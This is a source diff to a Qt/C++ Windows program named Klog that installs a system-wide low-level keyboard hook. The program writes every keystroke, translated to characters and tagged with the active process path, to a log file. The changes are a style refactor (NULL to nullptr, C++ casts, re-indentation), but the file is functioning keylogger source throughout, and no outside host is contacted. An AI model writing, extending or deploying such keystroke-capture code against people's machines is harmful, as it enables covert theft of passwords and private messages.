@@ -31,7 +31,7 @@ Klog::Klog(QObject *parent) :
 {
     connect(timer.get(), &QTimer::timeout, this, &Klog::timerIsUp);
 
-    HINSTANCE hInstance = GetModuleHandle(NULL);
+    HINSTANCE hInstance = GetModuleHandle(nullptr);
 
     //Register hook
     HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
@@ -39,7 +39,7 @@ Klog::Klog(QObject *parent) :
                                           hInstance,
                                           0);
 
-    if (keyboardHook == NULL)
+    if (keyboardHook == nullptr)
         qDebug() << "Keyboard hook installation error.";
 }
 
@@ -53,7 +53,7 @@ LRESULT CALLBACK Klog::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
         if ( ! klog.logFile->open(QIODevice::Append | QIODevice::Text))
         {
             qDebug () << "Cannot open log file";
-            return CallNextHookEx(NULL, nCode, wParam, lParam);
+            return CallNextHookEx(nullptr, nCode, wParam, lParam);
         }
 
         QTextStream log(klog.logFile.get());
@@ -72,7 +72,7 @@ LRESULT CALLBACK Klog::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 
         //Get process path
         QString currProc;
-        if (GetModuleFileNameEx(handle, 0, procPath, MAX_PATH))
+        if (GetModuleFileNameEx(handle, nullptr, procPath, MAX_PATH))
         {
             currProc = QString::fromWCharArray(procPath);
         }
@@ -98,7 +98,7 @@ LRESULT CALLBACK Klog::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
             }
 
             //Replace device name with drive letter
-            devicePath.replace(0, wcslen(szTarget), (QChar)driveLetter + ':');
+            devicePath.replace(0, wcslen(szTarget), static_cast<QChar>(driveLetter + ':'));
             currProc = devicePath;
         }
 
@@ -115,7 +115,7 @@ LRESULT CALLBACK Klog::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 
         //KBDLLHOOKSTRUCT  contains information about a low-level keyboard input event:
         //vkCode, scanCode, flags, time, dwExtraInfo
-        KBDLLHOOKSTRUCT*  kbdHook = (KBDLLHOOKSTRUCT*) (lParam);
+        KBDLLHOOKSTRUCT*  kbdHook = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
 
         //Print keys
         switch (kbdHook->vkCode) {
@@ -149,29 +149,28 @@ LRESULT CALLBACK Klog::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 
             //Visible keys
             default:
+                //Check Shift and CapsLock state
+                bool isDownShift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+                bool isDownCapslock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+                bool isDownCtrl = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
 
-            //Check Shift and CapsLock state
-            bool isDownShift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
-            bool isDownCapslock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
-            bool isDownCtrl = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
+                BYTE kbdState[256];
+                wchar_t buff[4];
 
-            BYTE kbdState[256];
-            wchar_t buff[4];
+                GetKeyboardState(kbdState);
+                if (isDownShift) kbdState[16] = 0x80;
+                if (isDownCapslock) kbdState[20] = 0x01;
+                if (isDownCtrl) kbdState[17] = 0x00;
 
-            GetKeyboardState(kbdState);
-            if (isDownShift) kbdState[16] = 0x80;
-            if (isDownCapslock) kbdState[20] = 0x01;
-            if (isDownCtrl) kbdState[17] = 0x00;
+                //Get keyboard layout for current thread
+                HKL kbdLayout = GetKeyboardLayout(threadId);
+                //Translate virtual-key code to the corresponding Unicode character
+                ToUnicodeEx(kbdHook->vkCode, kbdHook->scanCode, kbdState, buff, _countof(buff), 0, kbdLayout);
 
-            //Get keyboard layout for current thread
-            HKL kbdLayout = GetKeyboardLayout(threadId);
-            //Translate virtual-key code to the corresponding Unicode character
-            ToUnicodeEx(kbdHook->vkCode, kbdHook->scanCode, kbdState, buff, _countof(buff), 0, kbdLayout);
-
-            //Write to log
-            log << QString::fromWCharArray(buff);
+                //Write to log
+                log << QString::fromWCharArray(buff);
         }
         klog.logFile->close();
     }
-    return CallNextHookEx(NULL, nCode, wParam, lParam);
+    return CallNextHookEx(nullptr, nCode, wParam, lParam);
 }
